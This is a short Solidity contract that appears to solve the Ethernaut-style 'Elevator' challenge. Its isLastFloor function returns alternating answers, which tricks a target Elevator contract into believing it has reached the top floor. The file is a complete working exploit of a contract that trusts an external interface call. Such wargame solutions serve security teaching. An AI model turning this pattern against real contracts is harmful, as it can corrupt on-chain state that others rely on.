// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Elevator, Building} from "./Elevator.sol";

contract BuildingFloor is Building {
    bool public toggle = true;
    Elevator public target;

    constructor (address _target) {
        target = Elevator(_target);
    }

    function isLastFloor(uint256 floor) override external returns (bool) {
        toggle = !toggle;
        return toggle;
    }
    function attack() public {
        target.goTo(18);  // any floor, doesn't matter
    }
}